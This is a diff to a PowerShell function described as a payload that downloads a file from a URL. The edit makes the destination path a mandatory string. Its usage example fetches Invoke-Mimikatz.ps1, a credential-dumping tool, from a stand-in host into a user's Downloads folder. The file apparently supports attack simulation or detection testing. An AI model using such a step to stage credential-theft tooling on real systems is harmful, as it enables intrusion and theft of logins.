@@ -11,7 +11,7 @@ This payload downloads a file from a URL to the given location.
 The URL parameter defines the file to be downloaded.
 
 .PARAMETER FULL_PATH
-The FULL_PATH parameter defines where the file will be downloaded.
+The FULL_PATH parameter defines the name and where the file will be downloaded.
 
 .EXAMPLE
 PS > Test-Download-File "https://mysite.co/Invoke-Mimikatz.ps1" "C:\Users\user\Downloads\script.ps1"
@@ -23,10 +23,11 @@ PS > Test-Download-File "https://mysite.co/Invoke-Mimikatz.ps1" "C:\Users\user\D
         [String]
         $URL,
 
-        [Parameter(Position = 1, Mandatory = $False)]
-        [Boolean]
-        $FULL_PATH = '.\'
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]
+        $FULL_PATH
     )
+
     # Downloads a new file
     (New-Object System.Net.WebClient).DownloadFile($URL, $FULL_PATH)
 
